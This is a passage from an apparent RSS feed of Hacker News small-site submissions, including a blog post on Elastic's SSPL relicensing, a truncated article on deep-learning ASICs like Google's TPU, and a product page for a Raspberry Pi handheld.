<![CDATA[Sourcehut blog condeming Trump and supporters]]>
            </title>
            <description>
<![CDATA[
Score 27 | Comments 26 (<a href="https://news.ycombinator.com/item?id=25783454">thread link</a>) | @lumpa
<br/>
January 14, 2021 | https://lists.sr.ht/~sircmpwn/sr.ht-discuss/%3CfaFmBHWTBbMkA8x8iTLj4srJ4wlAXXKoOQKOAk5ZXI%40cp3-web-024.plabs.ch%3E | <a href="https://web.archive.org/web/*/https://lists.sr.ht/~sircmpwn/sr.ht-discuss/%3CfaFmBHWTBbMkA8x8iTLj4srJ4wlAXXKoOQKOAk5ZXI%40cp3-web-024.plabs.ch%3E">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://lists.sr.ht/~sircmpwn/sr.ht-discuss/%3CfaFmBHWTBbMkA8x8iTLj4srJ4wlAXXKoOQKOAk5ZXI%40cp3-web-024.plabs.ch%3E</link>
            <guid isPermaLink="false">hacker-news-small-sites-25783454</guid>
            <pubDate>Thu, 14 Jan 2021 22:12:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CSS Turing Machine]]>
            </title>
            <description>
<![CDATA[
Score 57 | Comments 19 (<a href="https://news.ycombinator.com/item?id=25782120">thread link</a>) | @mr_tyzic
<br/>
January 14, 2021 | https://brandondong.github.io/css-turing-machine/ | <a href="https://web.archive.org/web/*/https://brandondong.github.io/css-turing-machine/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://brandondong.github.io/css-turing-machine/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25782120</guid>
            <pubDate>Thu, 14 Jan 2021 20:37:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Elasticsearch and Kibana are now business risks]]>
            </title>
            <description>
<![CDATA[
Score 90 | Comments 22 (<a href="https://news.ycombinator.com/item?id=25781695">thread link</a>) | @vmbrasseur
<br/>
January 14, 2021 | https://anonymoushash.vmbrasseur.com/2021/01/14/elasticsearch-and-kibana-are-now-business-risks | <a href="https://web.archive.org/web/*/https://anonymoushash.vmbrasseur.com/2021/01/14/elasticsearch-and-kibana-are-now-business-risks">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
        <header>
          
          
          <p><strong> </strong> <time datetime="2021-01-14T00:00:00-08:00">January 14, 2021</time></p>
          
          
            <p> 




  4 minute read

</p>
          
        </header>
      

      <section itemprop="text">
        
        <p>In a play to convert users of their open source projects into paying customers, today Elastic announced that they are <a href="https://www.elastic.co/blog/licensing-change">changing the license</a> of both Elasticsearch and Kibana from the open source Apache v2 license to <a href="https://www.mongodb.com/licensing/server-side-public-license">Server Side Public License</a> (SSPL). If your organisation uses the open source versions of either Elasticsearch or Kibana in its products or projects, it is now at risk of being forced to release its intellectual property under terms dictated by another.</p>

<p>If you’re not yet aware of the SSPL, you can catch up <a href="https://mjg59.dreamwidth.org/51230.html">here</a>. As licenses go, it’s pretty problematic from a business perspective. Every <a href="https://en.wikipedia.org/wiki/Intellectual_property">IP lawyer</a> to whom I’ve showed the text of the SSPL has been rather alarmed before they even reach the end of it. Basically, it’s a hostile proprietary license masquerading in open source clothing. By using an SSPL project in your code, you are agreeing that if you provide an online service using that code then you will release not only that code but also the code for every supporting piece of software, all under the SSPL. It’s not a stretch to interpret the wording of the license as requiring users of the SSPL’d software therefore to release the code for everything straight down to the bare metal. There are those who will point to <a href="https://www.mongodb.com/licensing/server-side-public-license/faq">the FAQ</a> for the SSPL and claim that the license isn’t interpreted in that way because the FAQ says so. Unfortunately, when you agree to a license you are agreeing to the <em>text of that license document</em> and not to a FAQ. If the text of that license document is ambiguous, then so are your rights and responsibilities under that license. Should your compliance to that license come before a judge, it’s <em>their</em> interpretation of those rights and responsibilities that will hold sway. This ambiguity puts your organisation at risk.</p>

<p>In <a href="https://www.elastic.co/blog/licensing-change">its announcement</a>, Elastic claims that this is simply a change of open source license. In one way they’re correct: they’re changing the license away from the open source Apache v2 license. However they are changing to what can best be described as a proprietary source available license, <em>not</em> to an open source one. MongoDB, the originators of SSPL, requested that <a href="https://opensource.org/">Open Source Initiative</a> (OSI) (the standards body that maintains the <a href="https://opensource.org/osd-annotated">Open Source Definition</a> and certifies licenses as open source) certify the SSPL as such. After a great deal of discussion among the panel of legal, licensing, and open source experts, MongoDB withdrew the SSPL from consideration as an open source license, as it appeared highly unlikely it would be certified as open source. That SSPL is not an open source license is no longer in dispute. That ship has sailed. If you have a problem with this, I suggest you <a href="https://lists.opensource.org/pipermail/license-discuss_lists.opensource.org/2019-May/020483.html">take it up</a> with OSI. As for Elastic’s public and verifiably false claim that SSPL is an open source license, it’s my hope that OSI will have a conversation with them and make a public statement of their own shortly.</p>

<p>No, this is a business decision, not an ideological one. Elastic made a business decision to change to this hostile proprietary license to give them a way to <del>extort</del>influence users to become customers. Without a great deal more strategic information about Elastic’s business and operations none of us are qualified to judge whether it’s the correct decision, but the decision itself is valid. They are allowed to make this sort of strategic move for their company.</p>

<p>However, you and your organisation have now also been forced into a business decision. If your organisation uses the Apache v2 licensed Elasticsearch or Kibana in its projects or products, it must now assume that it is at risk one way or another. It can upgrade to version 7.11 of these projects, thereby accepting the terms of SSPL and potentially also being required to release the code for its entire stack (a great deal of which it will not have the copyright over and will be unable to release, thereby potentially being in violation of SSPL). It can remain on version 7.10, but then it will no longer receive future updates, including important security fixes, thereby taking on another sort of risk. It could choose to pay for a Gold+ license for the software, but it’s unlikely that the budget is prepared for this sort of unexpected expense. And finally it can rearchitect its project or product, replacing Elasticsearch and/or Kibana with alternatives. Frankly, considering today’s unfriendly move by Elastic, putting some space between it and your organisation may be the safest alternative in the long run, but it will come with its own considerable price tag in time and other potential opportunity and switching costs.</p>

<p>The one thing your organisation cannot afford to do is ignore this. It’s time to call a meeting with your legal, software development, product, finance, and strategy teams to start to figure out the best option for you.</p>

<blockquote>
  <p>For more information on relicensing moves like this, please see <a href="https://anonymoushash.vmbrasseur.com/2019/06/07/the-problem-with-amazon-and-open-source-isnt-amazon/">The problem with Amazon and Open Source isn’t Amazon</a>.</p>
</blockquote>

<hr>

<blockquote>
  <p>Judging from the bandwidth usage stats on my hosting service, people seem to appreciate this post. Thank you for that. If you’d like me to provide corporate open source strategy for your company, please <a href="https://www.vmbrasseur.com/about/#contact">drop me an email</a>. I’ll soon be kicking my job search into high gear after <a href="https://anonymoushash.vmbrasseur.com/2020/06/01/farewell-juniper">Juniper laid off its open source team</a> last year. Contacting me now makes it more likely your company will be in consideration for my next role.</p>
</blockquote>

        
      </section>

      

      


      
  

    </div></div>]]>
            </description>
            <link>https://anonymoushash.vmbrasseur.com/2021/01/14/elasticsearch-and-kibana-are-now-business-risks</link>
            <guid isPermaLink="false">hacker-news-small-sites-25781695</guid>
            <pubDate>Thu, 14 Jan 2021 20:02:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hardware for Deep Learning. Part 4: ASIC]]>
            </title>
            <description>
<![CDATA[
Score 28 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25781471">thread link</a>) | @lelf
<br/>
January 14, 2021 | https://blog.inten.to/hardware-for-deep-learning-part-4-asic-96a542fe6a81 | <a href="https://web.archive.org/web/*/https://blog.inten.to/hardware-for-deep-learning-part-4-asic-96a542fe6a81">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><figure><p><img alt="Image for post" src="https://miro.medium.com/proxy/0*fIsAHCkMLWi8Mwfp"></p></figure><div><div><div><div><p><a href="https://moocaholic.medium.com/?source=post_page-----96a542fe6a81--------------------------------" rel="noopener"><img alt="Grigory Sapunov" src="https://miro.medium.com/fit/c/96/96/1*fTggKeGD_XK_nO-qyW3zLw.jpeg" width="48" height="48"></a></p></div></div></div></div><p id="4aeb">This is a part about ASICs from the “Hardware for Deep Learning” series. The content of the series <a href="https://medium.com/@moocaholic/hardware-for-deep-learning-current-state-and-trends-51c01ebbb6dc" target="_blank" rel="noopener">is here</a>.</p><p id="2e3c"><strong><em>As of beginning 2021, ASICs now is the only real alternative to GPUs for <br>1) deep learning training (definitely) or <br>2) inference (less so, because there are some tools to use FPGAs with a not-so-steep learning curve or ways to do efficient inference on CPUs).</em></strong></p><p id="d58c">Now, when every large company launches it’s own DL or AI chip, it’s impossible to be silent. So, ASICs.</p><p id="f2a9">· <a href="#7903" rel="noopener">ASIC</a><br>· <a href="#e04d" rel="noopener">Google TPU</a><br> ∘ <a href="#5531" rel="noopener">TPU v1</a><br> ∘ <a href="#3948" rel="noopener">TPU v2</a><br> ∘ <a href="#641e" rel="noopener">TPU v3</a><br> ∘ <a href="#fb18" rel="noopener">TPU v4</a><br> ∘ <a href="#419a" rel="noopener">TPU POD (and Multi-POD)</a><br>· <a href="#93a6" rel="noopener">Practical considerations</a><br> ∘ <a href="#dddf" rel="noopener">Performance</a><br> ∘ <a href="#1ea2" rel="noopener">Price</a><br> ∘ <a href="#54a9" rel="noopener">Code</a><br>· <a href="#132d" rel="noopener">Habana (acquired by Intel)</a><br> ∘ <a href="#ffc5" rel="noopener">Habana Goya</a><br> ∘ <a href="#875e" rel="noopener">Habana Gaudi</a><br>· <a href="#9e98" rel="noopener">Intel (Nervana) NNP</a><br> ∘ <a href="#86e9" rel="noopener">NNP-T (discontinued)</a><br> ∘ <a href="#d84a" rel="noopener">NNP-I (discontinued)</a><br>· <a href="#6238" rel="noopener">Graphcore IPU</a><br> ∘ <a href="#8e47" rel="noopener">Colossus MK2 GC200 IPU</a><br> ∘ <a href="#a6ef" rel="noopener">Colossus MK1 GC2 IPU</a><br> ∘ <a href="#9592" rel="noopener">IPU architecture</a><br> ∘ <a href="#9ebb" rel="noopener">Systems and PODs</a><br> ∘ <a href="#b484" rel="noopener">Benchmarks</a><br> ∘ <a href="#3b5f" rel="noopener">Software</a><br>· <a href="#3e5b" rel="noopener">Cerebras</a><br> ∘ <a href="#c16c" rel="noopener">Software platform</a><br>· <a href="#9b1c" rel="noopener">AWS</a><br> ∘ <a href="#a621" rel="noopener">AWS Inferentia</a><br> ∘ <a href="#071d" rel="noopener">AWS Trainium</a><br>· <a href="#c995" rel="noopener">Huawei Ascend</a><br> ∘ <a href="#5af5" rel="noopener">Atlas 300I Inference Card</a><br> ∘ <a href="#bf68" rel="noopener">Atlas 300T Training Card</a><br> ∘ <a href="#782e" rel="noopener">DaVinci AI architecture</a><br>· <a href="#d611" rel="noopener">Bitmain Sophon</a><br>· <a href="#aadb" rel="noopener">Alibaba Hanguang 800</a><br>· <a href="#d5be" rel="noopener">Baidu Kunlun</a><br>· <a href="#783c" rel="noopener">Groq</a><br>· <a href="#3b39" rel="noopener">Qualcomm Cloud AI 100</a><br>· <a href="#121a" rel="noopener">Others</a><br>· <a href="#28b8" rel="noopener">Other interesting links</a><br>· <a href="#0ab7" rel="noopener">Summary</a><br>· <a href="#ad26" rel="noopener">Release Notes</a></p><p id="b788"><strong><em>ASIC (application-specific integrated circuit)</em></strong> is an integrated circuit customized for a particular use, rather than intended for general-purpose use like CPU.</p><p id="f6b9">ASICs are more specialized than GPUs because a GPU is still a massively parallel processor with thousands of computational units capable to execute many different algorithms, while an ASIC is a processor designed to be capable of doing a very small set of computations (say, only matrix multiplications). But it does so extremely well.</p><p id="d7af">However, some of the ASICs described here are rather universal computers capable of solving different tasks (and in AI there are many different complex tasks, not only neural networks) but with uncommon (for now) architecture. There are different names for these processors: NPU, XPU, TPU, IPU, and so on, and maybe one day they will become for the computing field the same thing GPU became once.</p><p id="5ad1">Comparing to FPGA, you can’t reprogram ASIC to do a different thing once you need it (but remember, some of them are rather universal), its logic is fixed since being produced, yet on FPGA you can create another circuit that better suits your needs.</p><p id="0465">Due to this specialization, ASICs are usually much more energy efficient. AlphaGo example is a good case. While the first versions of AlphaGo were run on a cluster of CPUs and GPUs (<a href="https://en.wikipedia.org/wiki/AlphaGo#cite_note-DeepMindnature2016-11" target="_blank" rel="noopener">the distributed version in October 2015 was using 1,202 CPUs and 176 GPUs</a>), the later versions used TPUs achieving better results. To make a clear comparison it is required to compare the computing requirements of these algorithms as well, but I think, using here the overall performance + power consumption is a good proxy.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3000/0*gmCI3vWZZ8IPcilM" width="1500" height="762" srcset="https://miro.medium.com/max/552/0*gmCI3vWZZ8IPcilM 276w, https://miro.medium.com/max/1104/0*gmCI3vWZZ8IPcilM 552w, https://miro.medium.com/max/1280/0*gmCI3vWZZ8IPcilM 640w, https://miro.medium.com/max/1400/0*gmCI3vWZZ8IPcilM 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*gmCI3vWZZ8IPcilM?q=20"></p></div></div></div><figcaption><a href="https://deepmind.com/blog/article/alphago-zero-starting-scratch" target="_blank" rel="noopener">https://deepmind.com/blog/article/alphago-zero-starting-scratch</a></figcaption></figure><p id="07b4">Developing specialized hardware is a pretty long-term play.</p><p id="384f"><a href="https://arxiv.org/abs/1911.05289" target="_blank" rel="noopener">According to Google’s Jeff Dean</a>: <em>“Chip design projects that are started today often take 18 months to 24 months to finish the design, fabricate the semiconductor parts and get them back and install them into a production data center environment. </em><strong><em>For these parts to be economically viable, they typically must have lifetimes of at least three years</em></strong><em>. </em><strong><em>So, the challenge for computer architects building ML hardware is to predict where the fast-moving field of machine learning will be in the 2 to 5-year time frame.</em></strong><em>”</em></p><p id="afc1"><a href="https://www.electronicdesign.com/technologies/embedded-revolution/article/21808278/the-economics-of-asics-at-what-point-does-a-custom-soc-become-viable" target="_blank" rel="noopener">More on the economics of ASICs</a>.</p><p id="6771">ASICs are very interesting from different points of view. From the technical point of view, they propose specialized architectures, engineering solutions, and tradeoffs, and that’s a tasty part for the technically inclined people. For practitioners, the most important points are the performance, software support, and last but not least, the price.</p><p id="97f2">There is a lot of movement to ASIC right now. If you heard about Google TPUs (and you couldn’t live the last few years without hearing of them), then you know what is it about. TPU seems to be the most famous example of an ASIC.</p><p id="cb6d">Google <strong>TPU</strong>, or <strong>Tensor Processing Unit</strong>, now exists in its 4th generation (Google Edge TPU is a bit different story, we’ll talk about it in a separate post on Edge AI), yet the latest publicly available is still the 3rd one. The first one, TPU v1 appeared in 2015 and was designed for INT8 inference only. The TPU v2 and v3 were ready for training as well.</p></div></div><div><div><h2 id="5531">TPU v1</h2><p id="0d84">Google’s TPU v1 was put into production in 2015 and it was used internally by Google for their applications. In 2017 Google finally published a technical description of the chip called “<a href="https://arxiv.org/abs/1704.04760" target="_blank" rel="noopener">In-Datacenter Performance Analysis of a Tensor Processing Unit</a>”.</p><p id="32d7"><a href="https://cloud.google.com/blog/products/gcp/google-supercharges-machine-learning-tasks-with-custom-chip" target="_blank" rel="noopener">According to Google</a>, TPU was moved from research into production very fast, just within 22 days from the first tested silicon. Yet the work started in 2013 as a high-priority project when Google’s projections on using their speech technology by users (3 minutes a day) showed that it would require their datacenters to double to meet computation demands. The goal was to improve cost-performance by 10X over GPUs. The full cycle from design, to verification, building, and deploying to the datacenters took <a href="https://arxiv.org/abs/1704.04760" target="_blank" rel="noopener">15 months</a>.</p><p id="825b">No cloud TPU of this version was available to the public.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1580/0*ME21757y0tfrK3f8.png" width="790" height="475" srcset="https://miro.medium.com/max/552/0*ME21757y0tfrK3f8.png 276w, https://miro.medium.com/max/1104/0*ME21757y0tfrK3f8.png 552w, https://miro.medium.com/max/1280/0*ME21757y0tfrK3f8.png 640w, https://miro.medium.com/max/1400/0*ME21757y0tfrK3f8.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*ME21757y0tfrK3f8.png?q=20"></p></div></div></div><figcaption><em>Google TPU v1 </em>printed circuit card that fits into a SATA hard disk slot for drop-in installation.</figcaption></figure><p id="7cf7">The TPU was designed to be a coprocessor using a PCIe Gen3 x16 bus that provides 12.5GB/s of effective bandwidth. This choice allows plugging it into existing servers just as GPU does, up to 4 cards in a server. So, TPU v1 is a kind of matrix accelerator on the I/O bus.</p><p id="fa14">To simplify hardware design and debugging, the host server sends TPU instructions for it to execute (like an FPU, floating-point unit) rather than letting TPU fetch instructions by itself (like GPU does).</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1684/1*9uNlFIx5Uic2hoC4jIV6hg.png" width="842" height="623" srcset="https://miro.medium.com/max/552/1*9uNlFIx5Uic2hoC4jIV6hg.png 276w, https://miro.medium.com/max/1104/1*9uNlFIx5Uic2hoC4jIV6hg.png 552w, https://miro.medium.com/max/1280/1*9uNlFIx5Uic2hoC4jIV6hg.png 640w, https://miro.medium.com/max/1400/1*9uNlFIx5Uic2hoC4jIV6hg.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*9uNlFIx5Uic2hoC4jIV6hg.png?q=20"></p></div></div></div><figcaption>TPU Block Diagram.</figcaption></figure><p id="57aa">The heart of the TPU, the main computation part, is the yellow Matrix Multiply unit in the upper right-hand corner. It contains 256x256 “multiply and accumulate” units (MACs) that can perform 8-bit multiply-and-adds on signed or unsigned integers, which offers a peak throughput of <strong>92 TeraOps/second (TOPS) </strong>(65,536 * 700MHz clock rate = 46 × 10¹² multiply-and-add operations or 92 Teraops per second, 92 × 10¹²).</p><p id="3942">The weights for the matrix unit are staged through an on-chip Weight FIFO that reads from an <strong>off-chip 8 GB DRAM called Weight Memory</strong> (two 2133MHz DDR3 DRAM channels) for inference, weights are read-only. 8 GB supports many simultaneously active models.</p><p id="afb5">The 16-bit products are collected in the <strong>4 MB of 32-bit Accumulators</strong> below the matrix unit. The 4MB represents 4096, 256-element, 32-bit accumulators.</p><p id="2b12">The matrix unit produces one 256-element partial sum per clock cycle. When using a mix of 8-bit weights and 16-bit activations (or vice versa), the Matrix Unit computes at <strong>half-speed</strong>, and it computes at a <strong>quarter-speed</strong> when both are 16 bits.</p><p id="738c">The intermediate results are held in the <strong>24 MB on-chip Unified Buffer</strong>, which can serve as inputs to the Matrix Unit. A programmable DMA controller transfers data to or from CPU Host memory and the Unified Buffer.</p><p id="e908">The 24 MB Unified Buffer is almost a third of the die and the Matrix Multiply Unit is a quarter.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1438/1*UtQ4tN0wjK0CmiImhvdOuQ.png" width="719" height="578" srcset="https://miro.medium.com/max/552/1*UtQ4tN0wjK0CmiImhvdOuQ.png 276w, https://miro.medium.com/max/1104/1*UtQ4tN0wjK0CmiImhvdOuQ.png 552w, https://miro.medium.com/max/1280/1*UtQ4tN0wjK0CmiImhvdOuQ.png 640w, https://miro.medium.com/max/1400/1*UtQ4tN0wjK0CmiImhvdOuQ.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*UtQ4tN0wjK0CmiImhvdOuQ.png?q=20"></p></div></div></div><figcaption>Floor Plan of TPU die.</figcaption></figure><p id="095c">The light (blue) data buffers are 37% of the die, the light (yellow) compute is 30%, the medium (green) I/O is 10%, and the dark (red) control is just 2%. Control is much larger (and much more difficult to design) in a CPU or GPU.</p><p id="677a">The TPU ASIC is built on a 28nm process, runs at 700MHz, and consumes 40W when running (75W TDP).</p><p id="bb1f">TPU implements the matrix multiplication with the systolic array in a pipeline fashion. It relies on data from different directions arriving at cells in an array at regular intervals and being combined.</p><p id="2590">The matrix unit uses “systolic execution” to save energy by reducing reads and writes of the Unified Buffer. It relies on data from different directions arriving at cells in an array at regular intervals where they are combined. A given 65,536-element vector-matrix multiply operation moves through the matrix as a diagonal wave-front. The weights are preloaded and take effect with the advancing wave alongside the first data of a new block. Control and data are pipelined to give the illusion to the programmer that the 256 inputs are read at once and instantly update one location of each of 256 accumulators. From a correctness perspective, the software is unaware of the systolic nature of the matrix unit, but, for performance, must account for the latency of the unit. (<a href="https://cacm.acm.org/magazines/2018/9/230571-a-domain-specific-architecture-for-deep-neural-networks/fulltext" target="_blank" rel="noopener">source</a>)</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1122/1*cUuejVpcWwhRd_KE2nuNkw.png" width="561" height="418" srcset="https://miro.medium.com/max/552/1*cUuejVpcWwhRd_KE2nuNkw.png 276w, https://miro.medium.com/max/1104/1*cUuejVpcWwhRd_KE2nuNkw.png 552w, https://miro.medium.com/max/1122/1*cUuejVpcWwhRd_KE2nuNkw.png 561w" sizes="561px" data-old-src="https://miro.medium.com/max/60/1*cUuejVpcWwhRd_KE2nuNkw.png?q=20"></p></div></div><figcaption>Systolic data flow of the Matrix Multiply Unit</figcaption></figure><p id="736a">If you want to know more about systolic arrays, read the corresponding section from <a href="https://cloud.google.com/blog/products/gcp/an-in-depth-look-at-googles-first-tensor-processing-unit-tpu" target="_blank" rel="noopener">Google’s blog</a>. Another good and more detailed description can be found <a href="https://medium.com/@antonpaquin/whats-inside-a-tpu-c013eb51973e" target="_blank" rel="noopener">here</a>.</p><p id="f12a">Google’s benchmark figures all use the roofline performance model (see the <a target="_blank" rel="noopener" href="https://blog.inten.to/hardware-for-deep-learning-part-3-gpu-8906c1644664">section on GPU</a> for more details) because it offers insights on the causes of performance bottlenecks.</p><p id="997b">The assumption behind the model is that applications don’t fit in on-chip caches, so they are either computation-limited or memory bandwidth-limited. For HPC, the Y-axis is the performance in floating-point operations per second, thus the peak computation rate forms the “flat” part of the roofline. The X-axis is operational intensity, measured as floating-point operations per DRAM byte accessed. Memory bandwidth is measured in bytes per second, which turns into the “slanted” part of the roofline since (FLOPS/sec)/ (FLOPS/Byte) = Bytes/sec. Without sufficient operational intensity, a program is memory bandwidth-bound and lives under the slanted part of the roofline.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1936/1*TRZRMm7ZisNxPZOFP7gJDQ.png" width="968" height="632" srcset="https://miro.medium.com/max/552/1*TRZRMm7ZisNxPZOFP7gJDQ.png 276w, https://miro.medium.com/max/1104/1*TRZRMm7ZisNxPZOFP7gJDQ.png 552w, https://miro.medium.com/max/1280/1*TRZRMm7ZisNxPZOFP7gJDQ.png 640w, https://miro.medium.com/max/1400/1*TRZRMm7ZisNxPZOFP7gJDQ.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*TRZRMm7ZisNxPZOFP7gJDQ.png?q=20"></p></div></div></div><figcaption>The Roofline model for a single TPU die on log-log scales</figcaption></figure><p id="508c">The TPU has a long “slanted” part of its roofline, where operational intensity means that <strong>performance is limited by memory bandwidth rather than by peak compute</strong>. Five of the six benchmarking applications are happily bumping their heads against the ceiling.</p><p id="8560">Yet, rooflines for a single Haswell die and for a single K80 die show that the six NN applications are …</p></div></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.inten.to/hardware-for-deep-learning-part-4-asic-96a542fe6a81">https://blog.inten.to/hardware-for-deep-learning-part-4-asic-96a542fe6a81</a></em></p>]]>
            </description>
            <link>https://blog.inten.to/hardware-for-deep-learning-part-4-asic-96a542fe6a81</link>
            <guid isPermaLink="false">hacker-news-small-sites-25781471</guid>
            <pubDate>Thu, 14 Jan 2021 19:49:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Yarh.io Micro 2 Raspberry Pi 3B+ Hacker's Linux Handheld]]>
            </title>
            <description>
<![CDATA[
Score 23 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25780972">thread link</a>) | @enchiridion
<br/>
January 14, 2021 | https://yarh.io/yarh-io-m2.html | <a href="https://web.archive.org/web/*/https://yarh.io/yarh-io-m2.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    <section id="top-section">
        <div id="top-section-top">
            <nav>
                
            </nav>
            <p id="heading">
                
                <h2>Raspberry Pi 3B+ Hacker's Linux Handheld<br></h2>
            </p>
        </div>
    </section>
    <section id="yarh-io-mki">
        <div>
            <div>
                <div>
                    <p><a href="https://yarh.io/assets/img/yarh-m2-white-hand-large-t-001.png" target="_blank" data-lightbox="yarh-io-mki"><img src="https://yarh.io/assets/img/yarh-m2-white-hand-large-t-001.png" alt="YARH.IO M2 Handheld"></a></p>
                    <div>
                        <p>Welcome to the new stage of the YARH.IO project, where our goal is to build a device designed for hacking, coding, and creative use. YARH.IO Micro 2 has been made with&nbsp;hackers in mind, for&nbsp;computer experts who uses their technical knowledge to achieve new goals and overcome computer system limitations by non-standard or 'hackable' means.&nbsp;<br></p>
                        <p>YARH.IO Micro 2 project continues to take on the challenge of building a full featured, micro sized handheld, based on Raspberry Pi 3B+, 4" touch screen and Bluetooth keyboard without touchpad.&nbsp;&nbsp;<br></p>
                        <p>YARH.IO Micro 2 can run Raspberry Pi OS or Kali Linux, providing users with a rich range of applications and development tools.&nbsp;This is a rare handheld that allows users to write new program code directly on the device for the use on the device itself.</p>
                    </div>
                </div>
                <div>
                    <div>
                        <p>YARH.IO Micro 2 is powered by&nbsp;Raspberry Pi 3B+, offering the best ratio of functionality and computing power requirements for a mobile, battery powered device. The board is stripped down to reduce the total height. The ethernet RJ45 connector on the Pi 3B+ has been removed, while the double stack USB connectors were replaced with single stack USB connectors.<br></p>
                        <p>Pimoroni Hyper Pixel 4" IPS 800x480 display delivers a sharp, clear, and bright picture with a wide viewing angle. Capacitive&nbsp;touch screen with multi-touch allows for a simple and easy interaction with the user interface.<br></p>
                        <p>Minimalist keyboard provides comfortable typing when holding the device with both hands. Modifier keys grant easy access to special control keys and functions. Custom key remapping simplifies interaction with the system and its applications.</p>
                    </div>
                    <p><a href="https://yarh.io/assets/img/yarh-m2-white-accessories-large-t-002.png" target="_blank" data-lightbox="yarh-io-mki"><img src="https://yarh.io/assets/img/yarh-m2-white-accessories-large-t-002.png" alt="YARH.IO M2 Handheld with accessories"></a></p>
                </div>
                <div>
                    <p><a href="https://yarh.io/assets/img/yarh-m2-white-left-large-t-001.png" target="_blank" data-lightbox="yarh-io-mki"><img src="https://yarh.io/assets/img/yarh-m2-white-left-large-t-001.png" alt="YARH.IO M2 Handheld front left"></a></p>
                    <div>
                        <p>YARH.IO Micro 2 features extended USB connectivity. The two USB ports have been relocated to the top of the device and now allow users to simultaneously connect large profile USB accessories, such as WiFi adaptors, cellular modems, GPS, USB drives, and others.<br></p>
                        <p>A single, removable, high capacity Fenix ARB-L18-3500U 3500mAh Li-ion USB Rechargeable Battery powers the device. Removable battery ensures that an empty battery can be quickly replaced with a charged one. Fenix rechargeable battery provides direct charging via a Micro USB connector and a built-in battery charger.</p>
                        <p>High output Step-Up power supply has been used to effectively support power hungry USB accessories.&nbsp;</p>
                    </div>
                </div>
                <div>
                    <div>
                        <p>Arduino proMicro module controls the battery voltage. The module reads battery and power supply voltage, making the results available over I2C bus to the Raspberry Pi and to various custom build applications. The module also controls power LED as a way to indicate battery charge status.</p>
                        <p>With Arduino IDE installed, it is possible to program proMicro directly on the device, to customize battery charge LED indicator, and to add other creative functionality.</p>
                        <p>The DS3231 High Precision RTC Clock Module is used to store current time and date for the Raspberry Pi.</p>
                    </div>
                    <p><a href="https://yarh.io/assets/img/yarh-m2-white-top-large-t-001.png" target="_blank" data-lightbox="yarh-io-mki"><img src="https://yarh.io/assets/img/yarh-m2-white-top-large-t-001.png" alt="YARH.IO M2 Handheld top front"></a></p>
                </div>
                <div>
                    <p><a href="https://yarh.io/assets/img/yarh-m2-white-back-large-t-001.png" target="_blank" data-lightbox="yarh-io-mki"><img src="https://yarh.io/assets/img/yarh-m2-white-back-large-t-001.png" alt="YARH.IO M2 Handheld Back"></a></p>
                    <div>
                        <p>YARH.IO Micro 2 features simple mechanical design. Main frame used for mounting Raspberry Pi board and screen, power bed with conjunction with front panel provides mounting points for keyboard, power supply, battery, RTC and proMicro module.&nbsp;</p>
                        <p>Back panel features an open battery bay, allowing for quick battery replacement. In instances when&nbsp;battery&nbsp;replacement is not required, the bay can be covered with the battery cover. This set-up ensures that the battery can always be charged using the battery's built-in charger.</p>
                        <p>The I2C bus is available while the I2C connector is mounted on the right side of the device and can be used to connect external modules with I2C connectivity.&nbsp;Pimoroni Hyper Pixel display utilises all Raspberry Pi GPIO pins, therefore no additional GPIO connectors are present for the external devices.&nbsp;<br></p>
                    </div>
                </div>
                <div>
                    <p><a href="https://yarh.io/assets/img/yarh-m2-white-back-open-large-t-001.png" target="_blank" data-lightbox="yarh-io-mki"><img src="https://yarh.io/assets/img/yarh-m2-white-back-open-large-t-001.png" alt="YARH.IO M2 Handheld internals"></a></p>
                    <div>
                        <p>No 'click' assembly used. This is a fully hackable device with stainless steel button socket cap screws used&nbsp;throughout for multiple assembly and disassembly cycles.<br></p>
                        <p>The&nbsp;corners of the housing are protected with eight rugged-design rubber bumpers.&nbsp;<br></p>
                        <p>All parts are 3D printed using PLA and Flex plastics. ABS and ASA plastics can be used as an alternative, but require use of advanced printers and techniques.<br></p>
                        
                        <p>The list of parts used for the YARH.IO project can be purchased from Amazon and other online stores is available below.</p>
                    </div>
                </div>
                <div>
                    
                    <p><a href="https://yarh.io/assets/img/yarh-m2-white-front-kali-large-t-001.png" target="_blank" data-lightbox="yarh-io-mki"><img src="https://yarh.io/assets/img/yarh-m2-white-front-kali-large-t-001.png" alt="YARH.IO M2 Handheld Kali"></a></p>
                </div>
                <div>
                    <p><a href="https://yarh.io/assets/img/yarh-m2-white-usb-accessories-large-t-001.png" target="_blank" data-lightbox="yarh-io-mki"><img src="https://yarh.io/assets/img/yarh-m2-white-usb-accessories-large-t-001.png" alt="YARH.IO M2 Handheld USB accessories"></a></p>
                    <div>
                        <p>YARH.IO Micro 2 Project at a Glance.&nbsp;</p>
